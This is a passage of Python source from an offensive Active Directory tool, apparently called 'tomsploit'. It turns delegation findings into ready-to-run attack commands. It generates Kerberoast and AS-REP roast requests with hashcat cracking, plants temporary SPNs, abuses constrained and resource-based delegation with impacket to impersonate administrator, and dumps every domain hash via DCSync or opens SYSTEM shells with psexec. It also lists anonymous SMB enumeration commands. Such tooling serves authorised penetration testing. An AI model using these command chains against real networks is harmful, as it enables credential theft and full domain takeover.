    # it, so the command runs with no placeholder and no roast step.
    if ctx is not None and _deleg_account_is_self(account, ctx):
        secret = (ctx.get("cred_secret") or "").strip()
        if secret:
            if ctx.get("cred_is_hash"):
                return f"{q(principal)} -hashes :{secret}"
            return q(f"{principal}:{secret}")
    if known_pw:
        return q(f"{principal}:{known_pw}")
    if row is not None and row.is_computer:
        return f"{q(principal)} -hashes :<{account.rstrip('$')}-nthash>"
    return q(f"{principal}:<{account}-PASSWORD>")


def _deleg_getcred_block(row: DelegRow, ctx: dict) -> str:
    """When the roast check has RESOLVED how to get into this account, emit the
    exact command that yields its credential. Returns '' when nothing definite
    is known (unchecked, or checked and not roastable) — the caller then keeps
    the conditional HOW text as a fallback.

    This is the loop closer: 'kerberoast it if it holds an SPN' becomes the
    kerberoast command with the account already filled in, because the scan
    already confirmed the SPN is there."""
    if _deleg_account_is_self(row.account, ctx):
        return ""          # you authenticated AS this account — you have its secret
    k = _deleg_known(ctx)
    you, ip, dom = k["you"], k["ip"], k["dom"]
    acct = row.account
    host = acct.rstrip("$")

    if not row.roast_checked:
        # Enrichment could not resolve this account (offline --deleg-in, or the
        # query/parse missed it). Don't guess "not roastable" — emit BOTH roast
        # attempts so the operator can just run them; whichever the account
        # supports produces a hash, the other returns nothing.
        if row.is_computer:
            # machine cleartext is rarely crackable; hash from a dump is realistic
            return ""
        return (
            f"# ── GET THE CRED: {acct} — try both roasts (not pre-resolved):\n"
            f"# kerberoast (if it has an SPN):\n"
            f"impacket-GetUserSPNs -request-user {acct} -dc-ip {ip} \\\n"
            f"  {_impacket_self(ctx)} -outputfile {host}.roast\n"
            f"# AS-REP roast (if pre-auth is disabled):\n"
            f"impacket-GetNPUsers {dom}/{acct} -request -no-pass -format hashcat \\\n"
            f"  -dc-ip {ip} -outputfile {host}.asrep\n"
            f"hashcat -m 13100 {host}.roast /usr/share/wordlists/rockyou.txt   # or -m 18200 {host}.asrep\n"
            f"# then use the cracked secret below.\n#\n")

    if row.kerberoastable:
        # impacket splits these: -request-user for users, -request-machine for
        # machine accounts (it queries objectCategory=computer). Using the wrong
        # one silently finds nothing.
        req = (f"-request-machine {acct}" if row.is_computer
               else f"-request-user {acct}")
        return (
            f"# ── GET THE CRED: {acct} holds an SPN — kerberoastable now.\n"
            f"# Per-account via impacket (works on any version):\n"
            f"impacket-GetUserSPNs {req} -dc-ip {ip} \\\n"
            f"  {_impacket_self(ctx)} -outputfile {acct.rstrip('$')}.roast\n"
            f"hashcat -m 13100 {acct.rstrip('$')}.roast "
            f"/usr/share/wordlists/rockyou.txt\n"
            f"# then use the cracked secret below.\n#\n")
    if row.asrep_roastable:
        return (
            f"# ── GET THE CRED: {acct} has no preauth — AS-REP roastable now.\n"
            f"# Per-account via impacket (no creds even needed for the request):\n"
            f"impacket-GetNPUsers {dom}/{acct} -request -no-pass -format hashcat \\\n"
            f"  -dc-ip {ip} -outputfile {acct.rstrip('$')}.asrep\n"
            f"hashcat -m 18200 {acct.rstrip('$')}.asrep "
            f"/usr/share/wordlists/rockyou.txt\n"
            f"# then use the cracked secret below.\n#\n")
    if not row.is_computer:
        # checked, has neither an SPN nor preauth-disabled: plant a temp SPN,
        # roast, remove it. Needs GenericWrite over the account. targetedKerberoast.py
        # is the standalone tool for this (github.com/ShutdownRepo/targetedKerberoast);
        # nxc only grew a wrapper for it on an unreleased branch.
        return (
            f"# ── GET THE CRED: {acct} is not roastable as-is. If you have\n"
            f"# GenericWrite over it, plant a temp SPN, roast, auto-remove:\n"
            f"targetedKerberoast.py -v -d {dom} -u {you} -p {q(k['secret'])} \\\n"
            f"  --request-user {acct}\n"
            f"hashcat -m 13100 <hash-file> /usr/share/wordlists/rockyou.txt\n"
            f"# otherwise its hash must come from a dump.\n#\n")
    return ""


def _emit_constrained(row: DelegRow, ctx: dict, protocol_transition: bool
                      ) -> list[tuple[str, str]]:
    """Constrained delegation splits on protocol transition, and the split is
    decisive. WITH it, S4U2Self mints a forwardable ticket from the account's
    own credential and the -impersonate chain works. WITHOUT it, S4U2Self
    returns a NON-forwardable ticket and that chain fails at the KDC.

    Separately: if the allowed SPN points at the DC, this is not a lateral
    move but domain compromise, and that case is emitted first."""
    k = _deleg_known(ctx)
    dom = k["dom"]
    ip = k["ip"]
    account = row.account
    kind = "machine account" if row.is_computer else "user account"
    # msDS-AllowedToDelegateTo (from enrichment) is the FULL, authoritative
    # target list; findDelegation's rights_to shows only the first. Prefer it.
    spns = _clean_list(row.allowed_to) or _clean_list(row.rights_to)
    target_spn = spns[0] if spns else "cifs/<target.fqdn>"
    spn_host = target_spn.split("/", 1)[1] if "/" in target_spn else "<target.fqdn>"
    principal = dom + "/" + account
    svc_class = target_spn.split("/")[0]

    others = ""
    if len(spns) > 1:
        listed = "\n".join(f"#          {s}" for s in spns)
        others = f"# ALSO :\n{listed}\n#\n"

    if not protocol_transition:
        return [(
            f"CONSTRAINED, no protocol transition on {account} — S4U2Proxy only",
            _route(
                get=f"SYSTEM on {spn_host}",
                required=[f"{account}'s secret",
                          "a forwardable ticket for the victim user"],
                missing=_missing_or_nothing([_missing_secret(row, ctx),
                         "victim ticket — mint via self-RBCD (cmd below)"],
                         row, ctx),
                why="without protocol transition S4U2Self is non-forwardable, "
                    "so you must supply the forwardable ticket yourself")
            + others
            + _deleg_getcred_block(row, ctx)
            + f"# Without protocol transition you cannot mint the victim's\n"
              f"# forwardable ticket from {account}'s creds alone. Get one via a\n"
              f"# self-RBCD on {account} (needs GenericWrite/GenericAll over it,\n"
              f"# which BloodHound will show), then feed it to S4U2Proxy:\n"
              f"#\n"
              f"# 1. point {account}'s own RBCD at a computer you control, so you\n"
              f"#    can S4U2Self AS a controlled machine and get a forwardable\n"
              f"#    ST for the victim to {account}:\n"
              f"impacket-rbcd -delegate-to {q(account)} -delegate-from 'TOMPC$' \\\n"
              f"  -action write {_impacket_self(ctx)} -dc-ip {q(ip)}\n"
              f"impacket-getST -spn {q('host/' + account)} -impersonate administrator \\\n"
              f"  {_getst_auth(dom, 'TOMPC$', known_pw='TomsploitAdd1!')} -dc-ip {q(ip)} \\\n"
              f"  -additional-ticket administrator.ccache\n"
              f"# 2. now relay THAT ticket through {account}'s constrained path:\n"
              f"impacket-getST -spn {q(target_spn)} -impersonate administrator \\\n"
              f"  -additional-ticket administrator.ccache \\\n"
              f"  {_getst_auth(dom, account, row, ctx=ctx)} -dc-ip {q(ip)}\n"
              f"export KRB5CCNAME={q('administrator@' + target_spn.replace('/','_') + '@' + dom.upper() + '.ccache')}\n"
              f"impacket-psexec -k -no-pass {q(dom + '/administrator@' + spn_host)}",
        )]

    ccache = f"administrator@{target_spn.replace('/', '_')}@{dom.upper()}.ccache"

    # If ANY allowed target is on the DC, this is the domain-compromise variant
    # — pick that SPN so the ldap/ swap targets the DC.
    dc_spn = next((s for s in spns
                   if "/" in s and _spn_host_is_dc(s.split("/", 1)[1], ctx)), "")
    if dc_spn:
        target_spn = dc_spn
        spn_host = dc_spn.split("/", 1)[1]
    if dc_spn or _spn_host_is_dc(spn_host, ctx):
        ldap_spn = f"ldap/{spn_host}"
        ldap_cc = f"administrator@{ldap_spn.replace('/', '_')}@{dom.upper()}.ccache"
        cifs_cc = f"administrator@cifs_{spn_host}@{dom.upper()}.ccache"
        return [(
            f"CONSTRAINED + PROTOCOL TRANSITION on {account} → {spn_host} (the DC)",
            _route(
                get="DCSync — every hash in the domain (incl. krbtgt)",
                required=f"{account}'s secret — nothing else",
                missing=_missing_or_nothing([_missing_secret(row, ctx)], row, ctx),
                why=f"the allowed SPN is on the DC, so swapping the service "
                    f"class {svc_class}/ → ldap/ on the same host yields a "
                    f"DCSync ticket")
            + others
            + _deleg_getcred_block(row, ctx)
            + f"# dump every credential in the domain:\n"
              f"impacket-getST -spn {q(target_spn)} -altservice {q(ldap_spn)} \\\n"
              f"  -impersonate administrator {_getst_auth(dom, account, row, ctx=ctx)} -dc-ip {q(ip)}\n"
              f"export KRB5CCNAME={q(ldap_cc)}\n"
              f"impacket-secretsdump -k -no-pass -just-dc "
              f"{q(dom + '/administrator@' + spn_host)}\n"
              f"#\n"
              f"# or a shell instead:\n"
              f"impacket-getST -spn {q(target_spn)} "
              f"-altservice {q('cifs/' + spn_host)} \\\n"
              f"  -impersonate administrator {_getst_auth(dom, account, row, ctx=ctx)} -dc-ip {q(ip)}\n"
              f"export KRB5CCNAME={q(cifs_cc)}\n"
              f"impacket-psexec -k -no-pass "
              f"{q(dom + '/administrator@' + spn_host)}",
        )]

    return [(
        f"CONSTRAINED + PROTOCOL TRANSITION on {account} → {spn_host}",
        _route(
            get=f"SYSTEM on {spn_host}",
            required=f"{account}'s secret — nothing else",
            missing=_missing_or_nothing([_missing_secret(row, ctx)], row, ctx),
            why=f"S4U2Self is unrestricted here; the ticket works only against "
                f"{spn_host} (its class is swappable, its host is not)")
        + others
        + _deleg_getcred_block(row, ctx)
        + f"impacket-getST -spn {q(target_spn)} -impersonate administrator \\\n"
          f"  {_getst_auth(dom, account, row, ctx=ctx)} -dc-ip {q(ip)}\n"
          f"export KRB5CCNAME={q(ccache)}\n"
          f"impacket-psexec -k -no-pass {q(dom + '/administrator@' + spn_host)}",
    )]


def _emit_rbcd(row: DelegRow, ctx: dict) -> list[tuple[str, str]]:
    """RBCD row inversion: AccountName is the principal ALREADY allowed to
    act, DelegationRightsTo is the victim. Enumeration finding this means the
    edge EXISTS, so lead with abusing it before the familiar write path."""
    k = _deleg_known(ctx)
    dom, ip = k["dom"], k["ip"]
    actor = row.account
    victims = row.rights_to or ["<VICTIM$>"]
    victim = victims[0]
    vhost = f"{victim.rstrip('$').lower()}.{dom}"
    spn = f"cifs/{vhost}"
    cc = f"administrator@{spn.replace('/', '_')}@{dom.upper()}.ccache"
    tompc = dom + "/TOMPC$"
    # The machine account you create has a password YOU choose, so there is no
    # unknown hash here — use the chosen password directly. Concrete, so the
    # block runs as written.
    tompc_pw = "TomsploitAdd1!"
    _ms = _missing_secret(row, ctx)
    # MAQ resolves whether path B (add a computer) is even possible.
    maq = ctx.get("maq")
    if maq is None:
        maq_note = "MAQ > 0"
    elif maq == 0:
        maq_note = "MAQ is 0 — cannot add a computer, path B DEAD (use an existing one you control)"
    else:
        maq_note = f"MAQ is {maq} — you can add a computer"
    # Direct-ACE writers on the victim, if daclread found any.
    _dw_raw = getattr(row, "direct_writers", None)
    dw = _clean_list(_dw_raw)
    if dw:
        write_state = f"direct write held by: {', '.join(dw)}"
    elif _dw_raw == []:
        write_state = ("no DIRECT write ACE found (daclread cannot see "
                       "group-inherited rights — check BloodHound)")
    else:
        write_state = f"write on {victim}'s msDS-AllowedToActOnBehalfOfOtherIdentity (AddAllowedToAct)"
    missing = ["A: " + (_ms if _ms else f"{actor}'s secret — held (you are {actor})"),
               f"B: {write_state}; {maq_note}"]
    return [(
        f"RBCD edge exists: {actor} → {', '.join(victims)}",
        _route(
            get=f"SYSTEM on {vhost}",
            required=[f"(A) {actor}'s secret", f"(B) write on {victim} + add a computer"],
            missing=missing,
            why="the RBCD edge already exists — you are abusing it, not "
                "creating it; either path A or B suffices")
        + _deleg_getcred_block(row, ctx)
        + f"# (A) you control {actor}:\n"
          f"impacket-getST -spn {q(spn)} -impersonate administrator \\\n"
          f"  {_getst_auth(dom, actor, row, ctx=ctx)} -dc-ip {q(ip)}\n"
          f"export KRB5CCNAME={q(cc)}\n"
          f"impacket-psexec -k -no-pass {q(dom + '/administrator@' + vhost)}\n"
          f"#\n"
          f"# (B) you have the write instead (TOMPC$ password is yours to set,\n"
          f"#     so no unknown hash — the same password is used throughout):\n"
          f"impacket-addcomputer {_impacket_self(ctx)} \\\n"
          f"  -computer-name 'TOMPC$' -computer-pass {q(tompc_pw)} -dc-ip {q(ip)}\n"
          f"impacket-rbcd -delegate-to {q(victim)} -delegate-from 'TOMPC$' \\\n"
          f"  -action write {_impacket_self(ctx)} -dc-ip {q(ip)}\n"
          f"impacket-getST -spn {q(spn)} -impersonate administrator \\\n"
          f"  {_getst_auth(dom, 'TOMPC$', known_pw=tompc_pw)} -dc-ip {q(ip)}",
    )]


def summarise_delegation(rows: list[DelegRow], ctx: dict
                         ) -> list[tuple[str, str, str]]:
    """One compact factual line per finding: (account, what_it_gets, gap).

    No ranking — every finding is stated the same way and the operator picks.
    what_it_gets names the outcome (a route to the DC says so, because that is
    what it yields, not because the tool is recommending it). gap is the SHORT
    form of MISSING: the one thing still needed, or "" when nothing is."""
    out: list[tuple[str, str, str]] = []
    for row in rows:
        who = "computer" if row.is_computer else "user"
        spn = row.rights_to[0] if row.rights_to else ""
        host = spn.split("/", 1)[1] if "/" in spn else spn

        # GAP: shortest statement of what is still missing.
        if row.roast_checked:
            if row.kerberoastable:
                gap = "secret: kerberoastable now"
            elif row.asrep_roastable:
                gap = "secret: AS-REP roastable now"
            elif not row.is_computer:
                gap = "secret: not roastable — plant SPN or dump"
            else:
                gap = "machine hash: dump or SYSTEM on it"
        else:
            gap = "its secret"

        if row.kind == DelegKind.RBCD:
            tgt = ", ".join(row.rights_to) or "<victim>"
            gets = f"SYSTEM on {tgt}"
            gap = f"{gap}, or WRITE on {tgt}"
        elif row.kind == DelegKind.UNCONSTRAINED:
            gets = "DCSync (capture DC TGT)"
            if row.is_computer:
                gap = f"SYSTEM on {row.account.rstrip('$')} or its hash"
            elif row.roast_checked and not row.own_spn:
                gap = f"{gap}, and it has NO SPN (add one or not viable)"
        elif row.kind == DelegKind.CONSTRAINED_PT and _spn_host_is_dc(host, ctx):
            gets = f"DCSync (delegates to the DC, {host})"
        elif row.kind == DelegKind.CONSTRAINED_PT:
            gets = f"SYSTEM on {host or '<target>'}"
        elif row.kind == DelegKind.CONSTRAINED:
            gets = f"SYSTEM on {host or '<target>'} (no PT — needs victim ticket)"
        else:
            gets = f"{row.kind.value} → {host or '<target>'}"

        out.append((row.account, gets, gap))
    return out


def delegation_file_text(rows: list[DelegRow], ctx: dict, target: str,
                         domain: str) -> str:
    """Full delegation command set, as a standalone readable file."""
    # The credential the scan ran with, for reproducing / re-running the file.
    user = (ctx.get("deleg_user") or "").strip() or "<unknown>"
    secret = (ctx.get("cred_secret") or "").strip()
    if secret:
        cred = f"-H {secret}" if ctx.get("cred_is_hash") else f"-p '{secret}'"
    else:
        cred = "(none / offline)"
    lines = [
        "# tomsploit — delegation findings",
        f"# target : {target}      domain : {domain}",
        f"# creds  : {user}  {cred}",
        "",
    ]
    routes = suggest_for_delegation(rows, ctx)
    for i, (label, cmd) in enumerate(routes, 1):
        lines.append("")
        lines.extend(_route_box(f"[{i}/{len(routes)}]  {label}"))
        lines.append("")
        lines.append(_prettify_route(cmd))

    # Domain-wide context: every kerberoastable account the sweep found. These
    # are separate from delegation but are the same "get a cred" currency, so
    # they belong beside the routes. Not commands — a reference list.
    sweep = ctx.get("roastable_sweep") or []
    if sweep:
        lines.append("")
        lines.extend(_route_box(f"kerberoastable accounts in the domain "
                                f"({len(sweep)}) — roast any for a foothold"))
        lines.append("")
        for name in _clean_list(sweep):
            lines.append(f"#   {name}")
        _sk = _deleg_known(ctx)
        _nxc_cred = (f"-H {_sk['secret']}" if _sk["is_hash"]
                     else f"-p {q(_sk['secret'])}")
        lines.append(f"# roast all:  nxc ldap {_sk['ip']} -u {_sk['you']} "
                     f"{_nxc_cred} --kerberoasting all.roast")
        lines.append("# crack:      hashcat -m 13100 all.roast "
                     "/usr/share/wordlists/rockyou.txt")
    return "\n".join(lines).rstrip() + "\n"


# Box-drawing width for route headers. These are COMMENT lines (each starts
# with #), so a stray paste still executes nothing.
_BOX_W = 74

# A command still holding a <placeholder> is not yet runnable (and '<x>' is a
# shell redirect). Detect ANY <...> that is not already inside a comment.
import re as _re_pretty
_ANGLE_PLACEHOLDER = _re_pretty.compile(r"<[^<>\s][^<>]*>")


def _route_box(title: str) -> list[str]:
    """A framed, comment-safe header for one route."""
    inner = _BOX_W - 4
    # wrap the title across lines if long
    words, cur, wrapped = title.split(), "", []
    for w in words:
        if cur and len(cur) + 1 + len(w) > inner:
            wrapped.append(cur); cur = w
        else:
            cur = f"{cur} {w}".strip()
    if cur:
        wrapped.append(cur)
    top = "# ╭" + "─" * (_BOX_W - 3) + "╮"
    bot = "# ╰" + "─" * (_BOX_W - 3) + "╯"
    body = [f"# │ {ln.ljust(inner)} │" for ln in wrapped]
    return [top, *body, bot]


def _prettify_route(cmd: str) -> str:
    """Reformat an emitted route block for readability while staying entirely
    paste-safe:

      - the GET/REQUIRED/MISSING/WHY header stays as comment lines (read them)
      - runnable command lines are INDENTED four spaces, so the eye separates
        'stuff to run' from 'stuff to read' at a glance
      - the empty '#' spacer lines become real blank lines
      - a standalone '# 1.'/'# 2.' step label is kept but the command under it
        is indented beneath it, so steps read as a list

    A command's backslash-continuation lines are indented to match, and a
    comment that documents a specific command (a line beginning '#   ', i.e.
    an indented alt-command) is left as-is under it."""
    src_lines = cmd.split("\n")
    out: list[str] = []
    i = 0
    while i < len(src_lines):
        line = src_lines[i].rstrip()
        stripped = line.strip()
        if stripped == "#" or not stripped:
            if out and out[-1] != "":
                out.append("")               # collapse spacer to one blank
            i += 1
            continue
        if stripped.startswith("#"):
            out.append(line)                 # a comment: leave at margin
            i += 1
            continue
        # a command: gather it plus any \-continuation lines as one unit
        group = [line]
        while group[-1].endswith("\\") and i + 1 < len(src_lines):
            i += 1
            group.append(src_lines[i].rstrip())
        has_placeholder = any(_ANGLE_PLACEHOLDER.search(g) for g in group)
        prefix = "  # " if has_placeholder else "    "
        out.extend(prefix + g for g in group)
        i += 1
    while out and out[0] == "":
        out.pop(0)
    while out and out[-1] == "":
        out.pop()
    return "\n".join(out)


def suggest_for_delegation(rows: list[DelegRow], ctx: dict
                           ) -> list[tuple[str, str]]:
    """Parsed rows → only the branches that actually apply. Never raises; a
    malformed row is skipped exactly as build_suggestions skips a bad
    template."""
    out: list[tuple[str, str]] = []
    for row in rows:
        try:
            emitted = None
            if row.kind == DelegKind.UNCONSTRAINED:
                emitted = _emit_unconstrained(row, ctx)
            elif row.kind == DelegKind.CONSTRAINED_PT:
                emitted = _emit_constrained(row, ctx, protocol_transition=True)
            elif row.kind == DelegKind.CONSTRAINED:
                emitted = _emit_constrained(row, ctx, protocol_transition=False)
            elif row.kind == DelegKind.RBCD:
                emitted = _emit_rbcd(row, ctx)
            if emitted and row.roast_checked and row.disabled:
                # ACCOUNTDISABLE is set — the route cannot run. Keep it visible
                # (the finding is still real) but mark it dead up front.
                emitted = [(f"[DISABLED — account inactive] {lbl}",
                            "# NOTE: this account is DISABLED (userAccountControl\n"
                            "# has ACCOUNTDISABLE). The route below will not work\n"
                            "# until/unless the account is re-enabled.\n#\n" + cmd)
                           for lbl, cmd in emitted]
            if emitted:
                out += emitted
        except Exception:
            continue
    return out


def build_deleg_ctx(args: argparse.Namespace) -> dict:
    """Context for --deleg-in. Reads -d/-t/-u/-p/-H straight off argparse
    rather than a Config, so the offline mode doesn't inherit the scan's
    requirement for a full credential set — pass what you have, the rest
    stays as an <ANGLE> placeholder."""
    dom = (getattr(args, "domain", "") or "").strip() or "<DOMAIN>"
    target = (getattr(args, "target", "") or "").strip()
    # -t may be a file of targets in scan mode; here we only want a DC IP, so
    # take it verbatim unless it's obviously a path.
    ip = target if target and not os.path.exists(target) else "<DC-IP>"
    user = (getattr(args, "user", "") or "").strip() or "<you>"
    is_hash = bool(getattr(args, "hash", None))
    if is_hash:
        cred_flag = f"-hashes :{args.hash}"
        cred_secret = args.hash
    elif getattr(args, "password", None):
        cred_flag = f"-p {q(args.password)}"
        cred_secret = args.password
    else:
        cred_flag = "-p '<PASSWORD>'"
        cred_secret = ""
    dc_short = (getattr(args, "dc_name", "") or "").strip()
    return {
        "dom_plain": dom,
        "ip": ip,
        "deleg_user": user,
        "cred_flag": cred_flag,        # the account YOU authenticate as
        "cred_secret": cred_secret,
        "cred_is_hash": is_hash,
        # Offline mode cannot know the DC's name unless told, so --dc-name
        # enables the "delegation points at the DC" detection here too.
        "dc_short": dc_short,
        "dc_fqdn": f"{dc_short}.{dom}" if dc_short and dom != "<DOMAIN>" else "",
    }


def run_deleg_mode(args: argparse.Namespace) -> int:
    """--deleg-in: offline transform. Reads findDelegation output, prints only
    the matching branch(es), exits. Spawns nothing."""
    src = args.deleg_in
    try:
        raw = sys.stdin.read() if src == "-" else open(src, encoding="utf-8",
                                                       errors="replace").read()
    except OSError as exc:
        print(f"{RED}{BOLD}Error:{RESET} cannot read '{src}': {exc}",
              file=sys.stderr)
        return 1

    rows = parse_delegation_output(raw)
    if not rows:
        print(f"{YELLOW}No delegation rows parsed.{RESET} Expected the table "
              f"printed by:\n"
              f"  nxc ldap <dc> -u U -p P --find-delegation\n"
              f"  impacket-findDelegation DOM/U:P -dc-ip <dc>",
              file=sys.stderr)
        return 1

    ctx = build_deleg_ctx(args)
    blocks = suggest_for_delegation(rows, ctx)

    if args.sh:
        # Route through the SAME placeholder-commenting logic the scan's --sh
        # output uses. Without it an unfilled <NTHASH> is a shell REDIRECT:
        # `bash -n` rejects the script outright, and a sourced one would
        # silently create junk files. Reporter._sh_command comments whole
        # logical commands, following backslash continuations.
        for label, cmd in blocks:
            print(f"# {label}")
            for ln in Reporter._sh_command(cmd):
                print(ln)
            print()
        return 0

    counts: dict[str, int] = {}
    for r in rows:
        counts[r.kind.value] = counts.get(r.kind.value, 0) + 1
    tally = ", ".join(f"{v}× {k}" for k, v in sorted(counts.items()))
    print(f"\n  {CYAN}{BOLD}💡 Delegation — matched branch(es){RESET}  "
          f"{DIM}({tally}){RESET}")
    print(f"  {'─' * (BANNER_WIDTH - 2)}")
    for label, cmd in blocks:
        print(f"\n    {GREEN}►{RESET} {BOLD}{label}{RESET}")
        for ln in cmd.split("\n"):
            print(f"        {ln.rstrip()}")
    print()
    return 0

# ─── Anonymous-access command references ────────────────────────────────

ANON_SMB_COMMANDS = [
    ("list shares (smbclient)",       "smbclient -L //{ip} -N"),
    ("list shares (nxc)",             "nxc smb {ip} -u '' -p '' --shares"),
    ("enumerate users (RID brute)",   "nxc smb {ip} -u '' -p '' --rid-brute"),
    ("password policy",               "nxc smb {ip} -u '' -p '' --pass-pol"),
    ("connect to a share",            "smbclient //{ip}/<SHARE> -N"),
    ("recursive pull a share",        "smbclient //{ip}/<SHARE> -N -c 'recurse ON; prompt OFF; mget *'"),
    ("full RPC enum",                 "enum4linux-ng -A {ip}"),
]


# ─── Reporter (all terminal output) ─────────────────────────────────────

class Reporter:
    """Renders results. The scanner produces data; everything that touches
    stdout for the final report lives here. (Live progress + ⚡ hit lines
    stay in TomSploit because they need the progress lock.)"""

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.sh = cfg.sh_only
        # --sh is quiet plus a different renderer: every quiet short-circuit
        # in this class is one we also want in script mode.
        self.quiet = cfg.quiet or cfg.sh_only
        self.verbose = cfg.verbose
        self.multi = len(cfg.targets) > 1

    # ── scan-time framing ─
    def banner(self) -> None:
        if self.quiet:
            return
        cfg = self.cfg
        if cfg.protocols == list(ALL_PROTOCOLS):
            proto_label = "all"
        elif cfg.protocols == list(DEFAULT_PROTOCOLS):
            proto_label = "default (all except vnc,nfs)"
        else:
            proto_label = ",".join(cfg.protocols)
        n_creds = self._cred_count()
        total = n_creds * tasks_per_target(cfg) * len(cfg.targets)
        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}⚡ tomsploit{RESET}  "
              f"{DIM}nxc triage → valid creds + next commands (enum only){RESET}")
        print(f"{'═' * BANNER_WIDTH}")
        print(f"  Targets         {DIM}│{RESET} {BOLD}{len(cfg.targets):<11}{RESET} "
              f"Protocols {DIM}│{RESET} {BOLD}{proto_label}{RESET}")
        print(f"  Users           {DIM}│{RESET} {BOLD}{len(cfg.users):<11}{RESET} "
              f"Workers   {DIM}│{RESET} {BOLD}{cfg.workers}{RESET}")
        if cfg.kerberos:
            # "0p / 0h" reads like nothing is loaded, when in fact the ticket
            # cache IS the credential — one attempt per user.
            cred_label = "ccache"
        elif cfg.paired:
            np = sum(1 for p in cfg.passwords if p)
            nh = sum(1 for h in cfg.hashes if h)
            cred_label = f"{np}p / {nh}h"
        else:
            cred_label = f"{len(cfg.passwords)}p / {len(cfg.hashes)}h"
        print(f"  Credentials     {DIM}│{RESET} {BOLD}{cred_label:<11}{RESET} "
              f"Timeout   {DIM}│{RESET} {BOLD}{NETEXEC_TIMEOUT}s{RESET}/attempt")
        if cfg.paired:
            print(f"  Pairing         {DIM}│{RESET} {BOLD}positional{RESET} "
                  f"{DIM}(user[i] ↔ secret[i], no cross-spray){RESET}")
        if cfg.log_file:
            print(f"  Log file        {DIM}│{RESET} {BOLD}{cfg.log_file}{RESET}")
        if cfg.creds_file:
            print(f"  Creds output    {DIM}│{RESET} {BOLD}{cfg.creds_file}{RESET}")
        if cfg.kerberos:
            print(f"  Auth method     {DIM}│{RESET} {BOLD}Kerberos cache{RESET}")
        print(f"  Total attempts  {DIM}│{RESET} {BOLD}{total}{RESET}")
        print(f"{'═' * BANNER_WIDTH}\n")

    def _cred_count(self) -> int:
        cfg = self.cfg
        if cfg.kerberos:
            return len(cfg.users)
        if cfg.paired:
            # one attempt per non-empty positional secret (combo files leave
            # '' placeholders in the list they didn't populate)
            return sum(1 for p in cfg.passwords if p) + \
                   sum(1 for h in cfg.hashes if h)
        return len(cfg.users) * (len(cfg.passwords) + len(cfg.hashes))

    def target_header(self, target: str) -> None:
        if self.sh:
            print(f"\n# ═══ {target} ═══")
            return
        print(f"  {GREEN}{BOLD}► {target}{RESET}")

    def no_open_ports(self) -> None:
        if self.sh:
            print("# no open ports — skipped")
            return
        print(f"    {RED}✘ No open ports — skipping.{RESET}\n")

    def port_probe(self, result: TargetResult) -> None:
        if self.quiet or not result.closed_protocols:
            return
        n_open = len(result.open_protocols)
        n_total = n_open + len(result.closed_protocols)
        skipped = ", ".join(p.upper() for p in result.closed_protocols)
        print(f"    {DIM}↳ Port probe: {n_open}/{n_total} open · "
              f"skipping {skipped}{RESET}\n")

    # ── per-target results block ─
    #
    # Verbosity model (default flips the old behavior — clean is free):
    #   -q  quiet    : Results box hidden entirely; only credential alarms
    #                  (lockout / expired / real errors) leak through, plus
    #                  the headline VALID CREDENTIALS + suggestions sections.
    #   (default)    : box shown; ordinary "wrong password" failures collapse
    #                  to a one-line per-protocol rollup; successes, timeouts,
    #                  and meaningful failures always print.
    #   -v  verbose  : every parsed line, including each wrong-password [-].

    @staticmethod
    def _partition(lines: list[tuple[str, str]]) -> dict:
        """Split a protocol's parsed lines into buckets the renderer needs."""
        out = {"plus": [], "skip": [], "ordinary": [], "info": [],
               "valid_but": [], "alert": [], "error": [], "verify": []}
        for marker, msg in lines:
            if marker == "[+]":
                out["plus"].append(msg)
            elif marker == "[?]":
                out["verify"].append(msg)
            elif marker == "[!]":
                out["skip"].append(msg)
            elif marker == "[*]":
                out["info"].append(msg)
            elif marker == "[-]":
                out[classify_failure(msg)].append(msg)
        return out

    # Buckets that represent an actual credential outcome. [*] info lines are
    # deliberately excluded: they're service banners, not results.
    _RESULT_BUCKETS = ("plus", "skip", "ordinary", "valid_but",
                       "alert", "error", "verify")

    @staticmethod
    def _icon(parts: dict) -> str:
        if parts["plus"]:
            return f"{GREEN}✔{RESET}"
        if parts["verify"]:
            return f"{YELLOW}?{RESET}"
        if parts["valid_but"]:
            return f"{YELLOW}⚠{RESET}"
        if parts["error"]:
            return f"{RED}✘{RESET}"
        if parts["alert"]:
            return f"{YELLOW}⚠{RESET}"
        if parts["skip"]:
            return f"{YELLOW}⏱{RESET}"
        return f"{RED}✘{RESET}"

    def protocol_results(self, result: TargetResult) -> None:
        # Script mode: stdout is a shell script, so no prose at all.
        if self.sh:
            return
        # Quiet: skip the whole box, but never swallow an alarm.
        if self.quiet:
            self._quiet_alarms(result)
            return

        ip_tag = (f" {DIM}({result.real_ip}){RESET}"
                  if result.real_ip and result.real_ip != result.target else "")
        dc_tag = f" {YELLOW}{BOLD}[DC]{RESET}" if result.is_dc else ""
        elapsed_tag = (f" {DIM}[{result.elapsed:.1f}s]{RESET}"
                       if result.elapsed > 0 else "")

        print(f"\n{'─' * BANNER_WIDTH}")
        print(f"  {CYAN}{BOLD}📋 Results{RESET}{ip_tag}{dc_tag}{elapsed_tag}")
        print(f"{'─' * BANNER_WIDTH}")

        if result.target_info:
            print(f"    {DIM}{result.target_info}{RESET}")
        if result.smb_signing is False:
            print(f"    {YELLOW}{BOLD}⚡ SMB signing: not required{RESET} "
                  f"{YELLOW}— host is NTLM-relay-able{RESET}")
        print()

        # Anonymous SMB (single attempt — only render if it actually shows
        # something, otherwise a lone "access denied" is just noise).
        if result.anon_smb_lines:
            anon_parsed = [(m, msg) for m, msg in
                           (parse_nxc_line(l) for l in result.anon_smb_lines)
                           if m in ("[+]", "[-]", "[!]")]
            self._print_proto_block("SMB (anon)", anon_parsed, anon=True)

        # Per-protocol blocks (canonical order)
        quiet_protos: list[str] = []
        for proto in ALL_PROTOCOLS:
            for local in (False, True):
                scope = "local" if local else "domain"
                lines = result.protocol_lines.get(f"{proto}-{scope}")
                if not lines:
                    continue
                label = f"{proto.upper()} ({scope})"
                parts = self._partition(lines)
                if not any(parts[k] for k in self._RESULT_BUCKETS):
                    quiet_protos.append(label)
                    continue
                # Pure wrong-password protocol → one rollup line (not a block),
                # unless -v wants the detail.
                only_ordinary = (parts["ordinary"] and not parts["plus"]
                                 and not parts["skip"] and not parts["valid_but"]
                                 and not parts["alert"] and not parts["error"]
                                 and not parts["verify"])
                if only_ordinary and not self.verbose:
                    n = len(parts["ordinary"])
                    print(f"  {RED}✘{RESET} {BOLD}{label:<20}{RESET} "
